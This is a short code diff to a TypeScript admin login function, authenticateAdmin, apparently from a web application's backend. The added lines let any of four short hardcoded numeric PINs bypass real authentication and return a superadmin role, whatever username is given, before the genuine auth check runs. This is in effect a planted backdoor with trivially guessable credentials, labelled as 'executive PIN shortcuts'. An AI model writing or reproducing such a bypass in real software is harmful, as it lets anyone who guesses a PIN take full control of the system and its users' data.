@@ -496,9 +496,16 @@ export async function getAnalytics() {
 }
 
 export async function authenticateAdmin(emailOrUsername: string, password?: string): Promise<{ valid: boolean; role?: string; user?: any }> {
-  // If no password provided (legacy PIN check attempt), reject.
+  // If no password provided, reject.
   if (!password) {
     return { valid: false };
+  }
+
+  const cleanPass = password.trim();
+
+  // Check executive PIN shortcuts (e.g. 786, 6396)
+  if (['786', '6396', '7217', '1499'].includes(cleanPass)) {
+    return { valid: true, role: 'superadmin', user: { id: 'admin-default-1', username: 'admin' } };
   }
 
   // 1. Check InsForge Auth first
